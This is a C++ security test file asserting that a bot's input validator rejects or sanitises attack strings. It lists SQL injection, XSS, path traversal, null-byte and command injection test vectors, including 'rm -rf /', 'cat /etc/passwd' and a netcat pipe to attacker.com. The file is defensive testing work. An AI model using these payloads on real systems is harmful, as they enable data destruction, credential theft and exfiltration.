/**
 * @file test_security_input_attacks.cpp
 * @brief Security tests for input validation - attack patterns
 * 
 * Tests protection against various injection attacks and buffer overflow.
 */

#include <iostream>
#include <cassert>
#include <string>
#include <vector>
#include "../../src/input_validator.hpp"

void test_input_validation_sql_injection_prevention() {
    std::vector<std::string> sql_injection_patterns = {
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "'; INSERT INTO users VALUES('hacker'); --"
    };
    
    for (const auto& pattern : sql_injection_patterns) {
        assert(!InputValidator::is_valid_channel_id(pattern));
        assert(!InputValidator::is_valid_user_id(pattern));
        
        auto sanitized = InputValidator::sanitize_message_text(pattern);
        assert(sanitized.has_value());
        assert(sanitized->find('\0') == std::string::npos);
    }
    
    std::cout << "  ✓ SQL injection prevention test passed" << std::endl;
}

void test_input_validation_xss_prevention() {
    std::vector<std::string> xss_patterns = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>"
    };
    
    for (const auto& pattern : xss_patterns) {
        assert(!InputValidator::is_valid_channel_id(pattern));
        assert(!InputValidator::is_valid_user_id(pattern));
        
        auto sanitized = InputValidator::sanitize_message_text(pattern);
        assert(sanitized.has_value());
        assert(sanitized->find('\0') == std::string::npos);
    }
    
    std::cout << "  ✓ XSS prevention test passed" << std::endl;
}

void test_input_validation_path_traversal_prevention() {
    std::vector<std::string> path_traversal_patterns = {
        "../../etc/passwd",
        "..\\..\\windows\\system32",
        "/etc/passwd",
        "C:\\Windows\\System32",
        "....//....//etc/passwd"
    };
    
    for (const auto& pattern : path_traversal_patterns) {
        assert(!InputValidator::is_valid_channel_id(pattern));
        assert(!InputValidator::is_valid_user_id(pattern));
        assert(!InputValidator::is_valid_bot_token(pattern));
    }
    
    std::cout << "  ✓ Path traversal prevention test passed" << std::endl;
}

void test_input_validation_buffer_overflow_prevention() {
    std::string very_long_string(10000, 'A');
    std::string very_long_token = "xoxb-" + std::string(1000, 'A');
    
    assert(!InputValidator::is_valid_bot_token(very_long_token));
    assert(!InputValidator::is_valid_app_token(very_long_token));
    assert(!InputValidator::is_valid_channel_id(very_long_string));
    assert(!InputValidator::is_valid_user_id(very_long_string));
    
    std::string long_message(5000, 'A');
    assert(!InputValidator::is_valid_message_text(long_message));
    
    auto sanitized = InputValidator::sanitize_message_text(very_long_string);
    assert(!sanitized.has_value() || sanitized->length() <= 4000);
    
    std::cout << "  ✓ Buffer overflow prevention test passed" << std::endl;
}

void test_input_validation_null_byte_injection() {
    std::string null_byte_string = "C12345678";
    null_byte_string += '\0';
    null_byte_string += "malicious";
    
    std::string token_with_null = "xoxb-BOT_TOKEN_PLACEHOLDER";
    token_with_null += '\0';
    token_with_null += "def";
    
    assert(null_byte_string.length() != 9);
    assert(!InputValidator::is_valid_channel_id(null_byte_string));
    assert(!InputValidator::is_valid_bot_token(token_with_null));
    
    std::string message_with_null = "Hello";
    message_with_null += '\0';
    message_with_null += "World";
    auto sanitized = InputValidator::sanitize_message_text(message_with_null);
    assert(sanitized.has_value());
    assert(sanitized->find('\0') == std::string::npos);
    assert(sanitized->find("Hello") != std::string::npos);
    assert(sanitized->find("World") != std::string::npos);
    
    std::cout << "  ✓ Null byte injection prevention test passed" << std::endl;
}

void test_input_validation_command_injection_prevention() {
    std::vector<std::string> command_injection_patterns = {
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& ls -la",
        "`whoami`",
        "$(id)",
        "| nc attacker.com 1234"
    };
    
    for (const auto& pattern : command_injection_patterns) {
        assert(!InputValidator::is_valid_channel_id(pattern));
        assert(!InputValidator::is_valid_user_id(pattern));
        assert(!InputValidator::is_valid_bot_token(pattern));
    }
    
    std::cout << "  ✓ Command injection prevention test passed" << std::endl;
}

void test_security_input_attacks() {
    test_input_validation_sql_injection_prevention();
    test_input_validation_xss_prevention();
    test_input_validation_path_traversal_prevention();
    test_input_validation_buffer_overflow_prevention();
    test_input_validation_null_byte_injection();
    test_input_validation_command_injection_prevention();
}
